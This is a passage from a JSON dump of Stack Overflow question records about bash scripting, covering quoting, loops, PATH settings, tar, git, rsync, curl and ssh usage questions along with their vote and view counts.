work.</p>\n"},{"tags":["bash","shell"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":40,"score":4,"question_id":13290186,"title":"bash variable substitution within command substitution","body":"<p>I want to do something like the following:</p>\n\n<pre><code>#!/bin/bash\n\ncmd=\"find . -name '*.sh'\"\necho $($cmd)\n</code></pre>\n\n<p>What I expect is that it will show all the shell script files in the current directory, but nothing happened.</p>\n\n<p>I know that I can solve the problem with eval according to this <a href=\"http://stackoverflow.com/questions/12718538/bash-command-substitution-with-variables\">post</a> </p>\n\n<pre><code>#!/bin/bash\n\ncmd=\"find . -name '*.sh'\"\neval $cmd\n</code></pre>\n\n<p>So my question is why command substitution doesn't work here and what's the difference between $(...) and eval in terms of the question?</p>\n"},{"tags":["bash","ubuntu","path"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":31,"score":0,"question_id":13281725,"title":"I change the PATH in ubuntu but it doesn't work","body":"<p>I installed Intellij Idea in my ubuntu.And I run it from the terminal.</p>\n\n<p>First <a href=\"http://stackoverflow.com/questions/11709374/change-path-permanently-on-ubuntu\">I do it like this</a>,change the PATH into .bashrc,and also source it.</p>\n\n<p>but it doesn't work.</p>\n\n<p>And I'm sure the directory is correct.\nNow I write a alias in .bashrc it works.</p>\n\n<pre><code>alias runidea='cd $THEDIR ; sh idea.sh'\n</code></pre>\n\n<p>I echo the PATH it's correct.but if I type <code>sh idea.sh</code> </p>\n\n<p>it tells me <code>sh:Can't open idea.sh</code></p>\n"},{"tags":["bash","loops"],"answer_count":3,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":4828,"score":4,"question_id":1629015,"title":"bash loop between two given dates","body":"<p>I'm trying to create a script that will loop through files that have their filenames written in the following format:  yyyymmdd.hh.filename.</p>\n\n<p>The script is called with:</p>\n\n<pre><code>./loopscript.sh 20091026.00 23\n./loopscript.sh 20091026.11 15\n./loopscript.sh 20091026.09 20091027.17\n</code></pre>\n\n<p>The need is for the script to check each hour between those two given dates/hours.  </p>\n\n<p>e.g. </p>\n\n<pre><code>cat 20091026.00.filename |more\ncat 20091026.01.filename |more\n...\ncat 20091026.23.filename |more\ncat 20091027.01.filename |more\ncat 20091027.02.filename |more\n...\n</code></pre>\n\n<p>and so on.</p>\n\n<p>any idea how to go about this?  I don't have any difficulty with standard 0 - x loops. or simple for loops.  Just not sure how to go about the above.</p>\n"},{"tags":["bash","shell","download","cut","youtube-dl"],"answer_count":3,"favorite_count":6,"up_vote_count":3,"down_vote_count":0,"view_count":841,"score":3,"question_id":8921496,"title":"Shell Script to download youtube files from playlist","body":"<p>I'm trying to write a bash script that will download all of the youtube videos from a playlist and save them to a specific file name based on the title of the youtube video itself. So far I have two separate pieces of code that do what I want but I don't know how to combine them together to function as a unit.</p>\n\n<p>This piece of code finds the titles of all of the youtube videos on a given page:</p>\n\n<pre><code>curl -s \"$1\" | grep '&lt;span class=\"title video-title \"' | cut -d\\&gt; -f2 | cut -d\\&lt; -f1\n</code></pre>\n\n<p>And this piece of code downloads the files to a filename given by the youtube video id (e.g. the filename given by youtube.com/watch?v=<strong>CsBVaJelurE</strong>&amp;feature=relmfu would be CsBVaJelurE.flv)</p>\n\n<pre><code>curl -s \"$1\" | grep \"watch?\" | cut -d\\\" -f4| while read video; \ndo youtube-dl \"http://www.youtube.com$video\";\ndone\n</code></pre>\n\n<p>I want a script that will output the youtube .flv file to a filename given by the title of the video (in this case BASH lesson 2.flv) rather than simply the video id name. Thanks in advance for all the help.</p>\n"},{"tags":["linux","bash"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":43,"score":1,"question_id":13287664,"title":"stdout all at once instead of line by line","body":"<p>I wrote a script that gets load and mem information for a list of servers by ssh'ing to each server. However, since there are around 20 servers, it's not very efficient to wait for the script to end. That's why I thought it might be interesting to make a crontab that writes the output of the script to a file, so all I need to do is cat this file whenever I need to know load and mem information for the 20 servers. However, when I cat this file during the execution of the crontab it will give me incomplete information. That's because the output of my script is written line by line to the file instead of all at once at termination. I wonder what needs to be done to make this work...</p>\n\n<p>My crontab:</p>\n\n<pre><code>* * * * * (date;~/bin/RUP_ssh) &amp;&gt; ~/bin/RUP.out\n</code></pre>\n\n<p>My bash script (RUP_ssh):</p>\n\n<pre><code>for comp in `cat ~/bin/servers`; do\n    ssh $comp ~/bin/ca\ndone\n</code></pre>\n\n<p>Thanks,</p>\n\n<p>niefpaarschoenen</p>\n"},{"tags":["bash","date","if-statement"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":33,"score":2,"question_id":13286316,"title":"Can I use Bash IF ELSE Statement Based on the day of the week","body":"<p>I am working on a script and I have 4 seperate Curl commands that I need to run dependent on the week of the month</p>\n\n<p>ie if week 1 run curl 1\n   if week 2 run curl 2</p>\n\n<p>etc</p>\n\n<p>there is only 4 and they only need to be run in the first 4 weeks of the month, week 5 doesnt matter.</p>\n\n<p>any ideas?</p>\n"},{"tags":["bash","tar","hidden-files"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":19,"score":0,"question_id":13285737,"title":"Tar Directory Contents Without Creating A Root Folder In Archive","body":"<p>I am running the following snippet in a bash script in a folder. This creates an archive where there is no root folder since I am running the script within the folder whose contents I am archiving.</p>\n\n<pre><code>tar -pczf $ARCHIVE_NAME --exclude=${ARCHIVE_NAME} --exclude=$(basename ${0}) *\n\nArchive Contents:\n/a/\n/b/\n/c/\n/a_normal_file\n</code></pre>\n\n<p>works great, but since I am using the * it is not archiving hidden files in the immediate directory. I did some searching and found <a href=\"http://stackoverflow.com/questions/4572973/archiving-ubuntu-tar-hidden-directories\">archiving (ubuntu tar) hidden directories</a> I have then changed it to:</p>\n\n<pre><code>tar -pczf $ARCHIVE_NAME --exclude=${ARCHIVE_NAME} --exclude=$(basename ${0}) .\n\nArchive Contents:\n/./a/\n/./b/\n/./c/\n/./.a_hidden_file\n/./a_normal_file\n</code></pre>\n\n<p>still works, but now there is a root folder being created with the name being the '.' character. The contents are then within that. How do I get my previous result, but where it still archives hidden files in the immediate directory?</p>\n\n<p>Thanks in advance!</p>\n"},{"tags":["git","osx","bash","osx-lion"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":2514,"score":3,"question_id":6813709,"title":"Git locale error on Lion OSX","body":"<p>Everything seems to work great, Git pulls and pushes; however -- it adds an annoying locale error. Any idea how to solve it?</p>\n\n<pre>\nkonzepz:project (master  ⚡) ➤ git pull\nbash: warning: setlocale: LC_ALL: cannot change locale (en_GB.UTF-8)\nAlready up-to-date.\n</pre>\n\n<p>Thanks!</p>\n"},{"tags":["bash","emacs","path"],"answer_count":4,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":801,"score":5,"question_id":6411121,"title":"How to make Emacs to use my .bashrc file?","body":"<p>I need to use my $PATH in Emacs to run some commands. How to make Emacs to use it? I installed Emacs from ubuntu repositories·</p>\n"},{"tags":["bash"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":13285326,"title":"bash scripting if condition error","body":"<p>This is my first bash script to sync my contents to the server. I want to pass the folder to be synced as a parameter. However, it does not work as expected.</p>\n\n<p>This is my script (saved as sync.sh):</p>\n\n<pre><code>echo \"STARTING SYNCING... PLEASE WAIT!\"\nvar=\"$1\" ;\necho \"parameter given is $var\"\n\nif [ \"$var\"==\"main\" ] || [ \"$var\"==\"all\" ] ; then\n    echo \"*** syncing  main ***\" ;\n    rsync -Paz /home/chris/project/main/ user@remote_host:webapps/project/main/ \nfi\n\nif [ \"$var\"==\"system\" ] || [ \"$var\"==\"all\" ] ; then\n    echo \"*** syncing  system ***\" ;\n    rsync -Paz /home/chris/project/system/ user@remote_host:webapps/project/system/ \nfi\n\nif [ \"$var\"==\"templates\" ] || [ \"$var\"==\"all\" ] ; then\n    echo \"*** syncing  templates ***\" ;\n    rsync -Paz /home/chris/project/templates/ user@remote_host:webapps/project/templates/ \nfi\n</code></pre>\n\n<p>And this my output:</p>\n\n<pre><code>chris@mint-desktop ~/project/ $ sh ./sync.sh templates\nSTARTING SYNCING... PLEASE WAIT!\nparameter given is templates\n*** syncing  main ***\n^Z\n[5]+  Stopped                 sh ./sync.sh templates\n</code></pre>\n\n<p>Although I gave \"templates\" as an argument, it ignores it. Why?</p>\n"},{"tags":["regex","bash","sed"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":440,"score":1,"question_id":1920422,"title":"Replace serial in zone files with sed","body":"<p>I need to replace the serials in my zone files, and I thought the easiest would be to use sed to change this. I have the following line to test.</p>\n\n<pre>\n@ IN SOA    ns1.domain.com.\twebdev.domain.com. (\n    \t2006080401\t; serial\n    \t8H\t\t; refresh\n    \t2H\t\t; retry\n    \t1W\t\t; expire\n    \t4h)\t\t; minimum ttl\n\n    \tNS\tns1.domain.com.\n    \tNS\tns2.domain.com.\n    \tMX 10\tmail1.domain.com.\n    \tMX 20\tmail2.domain.com.\n\ndomain.com.      A   255.255.255.255\nmail1   \t\tA\t255.255.255.255\nmail2   \t\tA\t10.10.10.10\n\nwww \t\tCNAME   domain.com.\nftp \t\tCNAME\twww\nwebmail \tCNAME\twww\n</pre>\n\n<p>The regular expression I've created using <a href=\"http://rubular.com/\" rel=\"nofollow\">http://rubular.com/</a> is the following. On rebular it the regex I got matches only one line.</p>\n\n<p><code>\n\\s*[0-9]<em>\\s</em>;\\s*serial\n</code></p>\n\n<p>So in sed I would use this as follows.</p>\n\n<p><code>\nsed -i 's/\\s*[0-9]<em>\\s</em>;\\s*serial/20091218 ; serial/g' *.zone\n</code></p>\n\n<p>My problem is that this doesn't change anything in the file. I've tried several things already. Thx for your help </p>\n"},{"tags":["bash","shell","script","sh"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":13271003,"title":"shell script for awk does not give desired output","body":"<pre><code>#!/bin/bash\n\nindex=101,102,103,104,105\n/bin/echo \"$index\" | /bin/awk -F\\, '{print $2}'\n</code></pre>\n\n<p>above is my shell script,(this is just a demo It should not be static) when I execute this It returns me value \"102\" it is right.</p>\n\n<pre><code> #!/bin/bash\n\nindex=101,102,103,104,105\n\nfor i in 1 2 3 4 5\ndo\n/bin/echo \"$index\" | /bin/awk -F\\, '{print $i}'\ndone\n</code></pre>\n\n<p>I want to print all numbers one by one...where I am wrong ?</p>\n\n<p>I have made some changes with \"null\" saprated values...Now what changes I suppose to make?\nto get and increment values of $i ?   </p>\n\n<pre><code>output of  *some command*\n1013\n1023\n12324\n13224\n3122\n2421\n\n#!/bin/bash\nindex=*some command*\ni=1\n\nfor LINE in ${OUTPUT} ; do\n    ans=$(/bin/echo \"$index\" | /bin/awk -vRS= -vFS=\"\\n\" '{print $i}')\n    i=`expr $i + 1`\ndone\n</code></pre>\n"},{"tags":["bash","curl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":13284398,"title":"bash: read text file, get HTTP headers, save results","body":"<p>I'm using Terminal in OS X 10.8\nThe challenge is to read text file (where each line is an url), get HTTP headers, save results to other text file</p>\n\n<p>Tried this: </p>\n\n<pre><code>for line in cat ~/Desktop/a.txt; do curl -I line &gt; ~/Desktop/b.txt;  done\n</code></pre>\n\n<p>plus multiple loop examples like </p>\n\n<pre><code>(while read l; do echo $l; done) &lt; ~/Desktop/a.txt \n</code></pre>\n\n<p>or </p>\n\n<pre><code>cat ~/Desktop/a.txt | while read CMD; do\necho $CMD\ndone\n</code></pre>\n\n<p>It seems to me that I cannot create simple loop.\nPlease, advise.\nBest,</p>\n"},{"tags":["bash","terminal"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":22,"score":1,"question_id":13283095,"title":"Bash overfill terminal","body":"<p>I'm using Bash on Ubuntu, and sometimes when I run a command, the output overfills the terminal, even when I scroll up to the top. How can I access the part of the output that's hidden because of the overfill?</p>\n"},{"tags":["linux","string","git","bash","whitespace"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":37,"score":1,"question_id":13280762,"title":"Send string with whitespaces as git commit message using bash","body":"<p>I'm creating a bash script that updates a git branch, everything works fine but now i want to add the option to specify the commit message as a parameter.</p>\n\n<p>I used this command first:</p>\n\n<pre><code>echo \"Executing git commit...\"\ngit commit -m \"$1\"\n</code></pre>\n\n<p>but when i sent something like this:</p>\n\n<pre><code>$ git.sh \"testing commit message\"\n</code></pre>\n\n<p>I get a bunch of errors telling me the command cannot be recognized by git.</p>\n\n<p>I suppose in this case that the double quotes I added are not passing the parameter as a single string but as many, so only the first one is taken by the -m option and git tries to pass the others as commit options.</p>\n\n<p>Is there a better way i can pass a multi word string as git commit message when getting it from the script arguments?</p>\n\n<p>I would really appreciate any suggestion you have.</p>\n"},{"tags":["python","linux","bash"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":40,"score":2,"question_id":13280528,"title":"Renaming sequential image files with gaps","body":"<p>I'm looking for a way to rename a list of image files with gaps to be sequential. Also I want to give them a padding of 4. I'm currently using Python 2.7 and Linux bash to program this.</p>\n\n<pre><code>    Example:\n\n    1.png\n    2.png\n    3.png\n    20.png\n    21.png\n    50.png\n</code></pre>\n\n<p>Should turn into:</p>\n\n<pre><code>    0001.png\n    0002.png\n    0003.png\n    0004.png\n    0005.png\n    0006.png\n</code></pre>\n\n<p>I also would like for the files name to be the same as the directory that they are currently in.</p>\n\n<pre><code>    Example:\n\n    c_users_johnny_desktop_images.0001.png\n    c_users_johnny_desktop_images.0002.png\n    c_users_johnny_desktop_images.0003.png\n    c_users_johnny_desktop_images.0004.png\n    c_users_johnny_desktop_images.0005.png\n    c_users_johnny_desktop_images.0006.png\n</code></pre>\n\n<p>Any help would be greatly appreciated! :)</p>\n\n<p>Cheers</p>\n"},{"tags":["bash","shell","hex","decimal"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":43,"score":-1,"question_id":13280131,"title":"Hexadecimal To Decimal in Shell Script","body":"<p>Can someone help me in telling how to convert a hexadecimal number to decimal number in a shell script? E.g. I want to convert the hexadecimal number <code>bfca3000</code> to decimal using a shell script. I basically want the difference of two hexadecimal numbers. My code is:</p>\n\n<pre><code>var3=`echo \"ibase=16; $var1\" | bc`\nvar4=`echo \"ibase=16; $var2\" | bc`\nvar5=$(($var4-$var3))               # [Line 48]\n</code></pre>\n\n<p>Upon executing ,I am getting the error as:</p>\n\n<pre><code>Line 48: -: syntax error: operand expected (error token is \"-\")\n</code></pre>\n"},{"tags":["git","bash","unix","version-control","grep"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":42,"score":1,"question_id":13263369,"title":"Getting a list of all unversioned files in a Git-controlled folder","body":"<p>Getting a list of unversioned files in a Git-controlled folder is way more annoying than it needs to be. Unless I really suck at reading man pages, it doesn't look like Git provides a facility to perform this operation on its own.</p>\n\n<p>There may be a more elegant way of performing this, but here's a one-liner I threw together for this task, in case anyone else ever needs to use it.</p>\n\n<p>Edit: turns out there's a standard way to do this that already works well.</p>\n\n<pre><code>git ls-files --other [--exclude-standard]\n</code></pre>\n"},{"tags":["git","bash","shell","git-branch"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":40,"score":3,"question_id":13280077,"title":"Check if git branch exists in bash: weird interpolation behavior","body":"<p>I'm trying to see if a certain branch exists within a shell script.</p>\n\n<p>However, <code>git-branch</code> seems to modify its output when interpolated. (I don't know the exact phenomenon or terminology here)</p>\n\n<p>For example, I'm trying to get the array of branches:</p>\n\n<pre><code>$ git branch\n  develop\n* master\n\n$ branches=`git branch`\n$ echo $branches\ndevelop compiler.sh HOSTNAME index.html master\n\n$ echo `git branch`\ndevelop compiler.sh HOSTNAME index.html master\n</code></pre>\n\n<p>A kind of <code>ls-files</code> seems to be getting in the way. How come? Is this Bash? Git? I'm confused.</p>\n"},{"tags":["bash","shell"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":13272131,"title":"Why do we use echo and bc together?","body":"<p>In Shell scripting (Linux/Ubuntu , Bash) , why do we use echo and bc commands together ? I am new to Shell scripting and have a basic understanding of pipes .\nI know that bc is kind of a seperate language . How does the following statement actually work (Just an example) ?<br>\n    <code>echo 5+6 | bc</code>    </p>\n"},{"tags":["bash","vim","bash-completion"],"answer_count":0,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":51,"score":3,"question_id":13280263,"title":"Ignore file extension in bash completion for vim","body":"<p>I wrote a small bash function to provide completion for vim. The function is the following:</p>\n\n<pre><code># completion for vim\n_vim()\n{\n    local cur prev\n\n    COMPREPLY=()\n    _get_comp_words_by_ref cur prev\n\n    case $prev in\n        -h|--help|-v|--version)\n            return 0\n            ;;\n    esac\n\n    if [[ \"$cur\" == -* ]] ; then\n        local _vopts='-v -e -E -s -d -y -R -Z -m -M -b -l -C'\n        _vopts=\"${_vopts} -N -V -D -n -r -r -L -A -H -F -T -u\"\n        _vopts=\"${_vopts} --noplugin -p -o -O --cmd -c -S -s -w -W\"\n        _vopts=\"${_vopts} -x -X --remote --remote-silent --remote-wait\"\n        _vopts=\"${_vopts} --remote-wait-silent --remote-tab --remote-send\"\n        _vopts=\"${_vopts} --remote-expr --serverlist --servername\"\n        _vopts=\"${_vopts} --startuptime -i -h --help --version\"\n        COMPREPLY=( $( compgen -W \"${_vopts}\" \\\n            -- \"$cur\" ) )\n        return 0\n    fi\n\n    local _VIM_IGNORE=\".pdf:.dvi:.jpg:.pyc:.exe:.tar:.zip:.ps\"\n    FIGNORE=\"${_VIM_IGNORE}\" _filedir\n} &amp;&amp;\ncomplete -F _vim vim vi v gv vd\n</code></pre>\n\n<p>I was trying to have it ignore files with extensions pdf, dvi, etc by defining the _VIM_IGNORE variable and setting FIGNORE to that but that does not work.</p>\n\n<p>Any idea how to accomplish this?</p>\n\n<p>Thanks.</p>\n"},{"tags":["string","bash","variables","arguments"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":12,"score":1,"question_id":13279417,"title":"Passing an empty string as a commandline argument using a bash variable to a command","body":"<p>I have a daemon that can be run manually from a bash shell like this:</p>\n\n<pre><code>daemon-binary --name some-name --separator '' /path/to/file\n</code></pre>\n\n<p>The command-line options for this daemon should be configured in <code>/etc/default/daemonname</code> like this:</p>\n\n<pre><code>DAEMON_OPTS=\"--name some-name --separator '' /path/to/file\"\n</code></pre>\n\n<p>This config is sourced by an init-script that starts the daemon passing the commandline options found in <code>DAEMON_OPTS</code> like this:</p>\n\n<pre><code>daemon-binary \"$DAEMON_OPTS\"\n</code></pre>\n\n<p>The result is, that the string <code>''</code> gets quoted again and instead of an empty string the <code>daemon-binary</code> gets passed two single. So in fact the result is the same as calling:</p>\n\n<pre><code>daemon-binary --name some-name --separator \"''\" /path/to/file\n</code></pre>\n\n<p>As far as I understand bash splits the <code>DAEMON_OPTS</code> at each whitespace, then quotes all the pieces and passes them to the <code>daemon-binary</code>.</p>\n\n<p>Is there any way to write the bash variable <code>DAEMON_OPTS</code> such that what's currently being expanded to <code>\"''\"</code> will be expanded into an empty string?</p>\n"},{"tags":["bash","shell","rename"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":24,"score":1,"question_id":13279516,"title":"Bash shell: how to add a name","body":"<p>I am trying to rename some zip files in bash with an _orig but I seem to be missing something.  Any suggestions??</p>\n\n<p>My goal:</p>\n\n<ul>\n<li>move files to an orig directory</li>\n<li>rename original files with a \"_orig\" in the name</li>\n</ul>\n\n<p>The code Ive tried to write:</p>\n\n<pre><code>mv -v  $PICKUP/*.zip $ORIGINALS\nfor origfile in $(ls $ORIGINALS/*.zip);do\n    echo \"Adding _orig to zip file\"\n    echo\n    added=$(basename $origfile '_orig').zip\n    mv -v $ORIGINALS/$origfile.zip $ORIGINALS/$added.zip\ndone\n</code></pre>\n\n<p>Sorry still kinda new at this.</p>\n"},{"tags":["string","bash"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":13278626,"title":"Bash/Shell How to remove extra spaces in a variable?","body":"<p>How to remove extra spaces in a variable?</p>\n\n<pre><code>VAR=\"    Eget ac vel volutpat      dic  tumst   est dui      adipiscing  \"\n\nCorrect result: VAR=\"Eget ac vel volutpat dic tumst est dui adipiscing\" \n</code></pre>\n\n<p>There are over 16,000,000 to be edited; <code>sed</code> is too slow!</p>\n\n<p>!!! E D I T !!!</p>\n\n<p>String OK! Thank you all</p>\n\n<p>BUT</p>\n\n<p>Text in array problem, gaps remain :-(</p>\n\n<pre><code>ITM=(\"  Eget ac  vel volutpat   |  Vel volutpat     dic tumst \"\n     \"    Vestibulum  laoreet     a semper  |orttitor      eu laoreet justo congue \")\n\nIFS=$'|'\n\nfor (( i=0 ; i&lt;16000000 ; i++ ))\ndo\n    AAA=( ITM[$i] )\n    B=${AAA[0]}     # \"  Eget ac  vel volutpat   \"\n    C=${AAA[1]}     # \"  Vel volutpat     dic tumst \"\n\ndone\n</code></pre>\n"},{"tags":["linux","bash"],"answer_count":5,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":40,"score":1,"question_id":13272717,"title":"inner join on two text files","body":"<p>Looking to perform an inner join on two different text files. Basically I'm looking for the inner join equivalent of the GNU join program. Does such a thing exist? If not, an awk or sed solution would be most helpful, but my first choice would be a linux command.</p>\n\n<p>Here's an example of what I'm looking to do</p>\n\n<p>file 1:</p>\n\n<pre><code>0|Alien Registration Card LUA|Checklist Update\n1|Alien Registration Card LUA|Document App Plan\n2|Alien Registration Card LUA|SA Application Nbr\n3|Alien Registration Card LUA|tmp_preapp-DOB\n0|App - CSCE Certificate LUA|Admit Type\n1|App - CSCE Certificate LUA|Alias 1\n2|App - CSCE Certificate LUA|Alias 2\n3|App - CSCE Certificate LUA|Alias 3\n4|App - CSCE Certificate LUA|Alias 4\n</code></pre>\n\n<p>file 2:</p>\n\n<pre><code>Alien Registration Card LUA\n</code></pre>\n\n<p>Results:</p>\n\n<pre><code>0|Alien Registration Card LUA|Checklist Update\n1|Alien Registration Card LUA|Document App Plan\n2|Alien Registration Card LUA|SA Application Nbr\n3|Alien Registration Card LUA|tmp_preapp-DOB\n</code></pre>\n"},{"tags":["bash","amazon-web-services","amazon-cloudformation"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":11,"score":0,"question_id":13274807,"title":"What's the proper way to retry commands in an AWS CFN template?","body":"<p>Sometimes commands like <code>apt-get update -q</code> fail randomly in a cloudformation template user-data script. What's the proper way to retry them till they succeed?</p>\n"},{"tags":["bash","shell","script"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":13275356,"title":"Execute shellscript inside shellscript","body":"<p>I've been scratching my head on this for a while.\nI have a script that is run by a root cron job.\nThe script executes, but there is a script inside the script that wont execute.\nHere is what we will call scriptA</p>\n\n<pre><code>#!/bin/bash\nlines=`wc -l &lt; /var/www/log/addme`;\nDATE=`date +%Y-%m-%d`\n\nif [[ $lines &gt; 4 ]];\nthen\necho \" \" &gt; /var/www/log/addme\nRESTART=/var/www/log/restart.sh\n$RESTART\nelse\necho \"No new hosts added\" | wall\nfi\n</code></pre>\n\n<p>Basically what the restart.sh script does is to restart a service.\nEverything works just fine when I run them from terminal, but not as cron jobs...\nI also tried to just put</p>\n\n<pre><code>./restart.sh\n/var/www/log/restart.sh\n</code></pre>\n\n<p>But with same result.\nAny thoughts? </p>\n"},{"tags":["bash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":27,"score":0,"question_id":13278255,"title":"proper use of quotes","body":"<p>I want to achieve this with bash:</p>\n\n<pre><code>for i in {1..2}\ndo\nfor j in {1..2}\ndo\necho $i $j &gt;&gt; tmp.txt\ndone\ndone\n\ncat tmp.txt\n1 1\n1 2\n2 1\n2 2\n</code></pre>\n\n<p>However I want to do it like this with the echo variable inside quotes:</p>\n\n<pre><code>cmd=\"\nfor i in {1..2};\ndo for j in {1..2};\ndo echo \\$i \"\\$j\" '\\$i' \"'\\$j'\" \\$i \"'$j'\" \\'$i\\' \\\"$j\\\" &gt;&gt; tmp.txt;\ndone;\ndone\n\"\neval $cmd\n</code></pre>\n\n<p>I can't seem to get the quotes right. Is it possible to achieve what I want?</p>\n\n<p>Thank you!</p>\n"},{"tags":["linux","bash","ssh","scp"],"answer_count":2,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":565,"score":5,"question_id":6268713,"title":"How can I scp a file and run an ssh command asking for password only once?","body":"<p>Here's the context of the question:</p>\n\n<p>In order for me to be able to print documents at work, I have to copy the file over to a different computer and then print from that computer. (Don't ask.  It's complicated and there is not another viable solution.)  Both of the computers are Linux and I work in bash.  The way I currently do this is I <code>scp</code> the file over to the print computer and then <code>ssh</code> in and print from command line.</p>\n\n<p>Here's what I would like to do:</p>\n\n<p>In order to make my life a bit easier, I'd like to combine these two step into one.  I could easily write a function that did both these steps, but I would have to provide my password twice.  Is there any way to combine the steps so that I only provide my password once?</p>\n\n<p><strong>Before somebody suggests it, key-based ssh-logins are not an option.  It has been specifically disabled by the Administrators for security reasons.</strong></p>\n\n<p>Solution:</p>\n\n<p>What I ended up doing was a modification of the second solution Wrikken provided.  Simply wrapping up his first suggestion in a function would have gotten the job done, but I liked the idea of being able to print multiple documents without having to type my password once per document.  I have a rather long password and I'm a lazy typist :)</p>\n\n<p>So, what I did was take a sequence of commands and wrap them up in a python script.  I used python because I wanted to parameterize the script, and I find it easiest to do in python.  I cheated and just ran bash commands from python through os.system.  Python just handled parameterization and flow control.  The logic was as follows:</p>\n\n<pre><code>if socket does not exist:\n    run bash command to create socket with timeout\ncopy file using the created socket\nssh command to print using socket\n</code></pre>\n\n<p>In addition to using a timeout, I also put have an option in my python script to manually close the socket should I wish to do so.  </p>\n\n<p>If anyone wants the code, just let me know and I'll either paste-bin it or put it on my git repo.</p>\n"},{"tags":["python","bash","shlex"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":59,"score":4,"question_id":13276755,"title":"Using Python to cat a file over ssh to a remote bash script","body":"<p>I'm using subprocess.popen with shlex to call a remote bash script using ssh.  This command works quite fine on bash itself.  But as soon as I try to translate it to python and shlex with subprocess.popen it errs out.</p>\n\n<p>Remote bash script:</p>\n\n<pre><code>#!/bin/bash\ntmp=\"\";     \nwhile read -r line;\ndo\n    tmp=\"$tmp $line\\n\";\ndone;\necho $tmp;\n</code></pre>\n\n<p><strong>BASH CMD RESULT</strong>(Invoking the remote bash script on the command line)</p>\n\n<pre><code>$&gt; ssh x.x.x.x cat &lt; /tmp/bef69a1d-e580-5780-8963-6a9b950e529f.txt \" | /path/to/bash/script.sh;\"\nBar\\n\n$&gt; \n</code></pre>\n\n<p>Python code</p>\n\n<pre><code>import shlex\nimport subprocess\n\nfn = '/tmp/bef69a1d-e580-5780-8963-6a9b950e529f.txt'\ns = \"\"\"                                                                    \nssh x.x.x.x cat &lt; {localfile} '| /path/to/bash/script.sh;'\n\"\"\".format(localfile=fn)\n\nprint s\n\nlexer = shlex.shlex(s)                                                     \nlexer.quotes = \"'\"                                                         \nlexer.whitespace_split = True                                              \nsbash = list(lexer)                                                        \nprint sbash                                                                \n\n# print buildCmd                                                           \nproc=subprocess.Popen(sbash,stdout=subprocess.PIPE,stderr=subprocess.PIPE) \nout,err=proc.communicate()                                                 \n\nprint \"Out: \" + out                                                        \nprint \"Err: \" + err                                                        \n</code></pre>\n\n<p><strong>PYTHON SCRIPT RESULT</strong>:</p>\n\n<pre><code>$&gt; python rt.py\n\n    ssh x.x.x.x cat &lt; /tmp/bef69a1d-e580-5780-8963-6a9b950e529f.txt '| /path/to/bash/script.sh'\n['ssh', 'x.x.x.x', 'cat', '&lt;', '/tmp/bef69a1d-e580-5780-8963-6a9b950e529f.txt', \"'| /path/to/bash/script.sh'\"]\nOut: \nErr: bash: /tmp/bef69a1d-e580-5780-8963-6a9b950e529f.txt: No such file or directory\n$&gt;\n</code></pre>\n\n<p>What am I missing?</p>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":22,"score":1,"question_id":13275013,"title":"Bash: current directory variable","body":"<p>What I'm trying to do is find the current working directory and save it into a variable, so that I can run <code>export $PATH=$PATH:currentdir+somethingelse</code>. :s not entirely sure if they have a variable that contains cwd by default.</p>\n\n<p>I've tried ${PWD} but that didn't work for me :(</p>\n"},{"tags":["bash"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":36,"score":0,"question_id":13276788,"title":"Create array in bash dynamically","body":"<p>I would like to create and fill an array dynamically but it doesn't work like this:</p>\n\n<pre><code>i=0\nwhile true; do\n    read input\n    field[$i]=$input\n    ((i++))\n    echo {$field[$i]}  \ndone\n</code></pre>\n"},{"tags":["bash","list","shell","for-loop","wildcard"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":13270322,"title":"Avoiding wildcard expansion in Bash loop","body":"<p>I want to use a list as parameter to a for-loop; but <em>with</em> double quotes, the list isn't understood as a list, and <em>without</em> quotes, the wildcards are evaluated to filenames. </p>\n\n<pre class=\"lang-sh prettyprint-override\"><code>A=\"a* b*\"\n\nfor ex in \"$A\"; do\n    echo \"$ex\";\ndone\n\nfor ex in $A; do\n    echo \"$ex\";\ndone\n</code></pre>\n\n<p>The first one 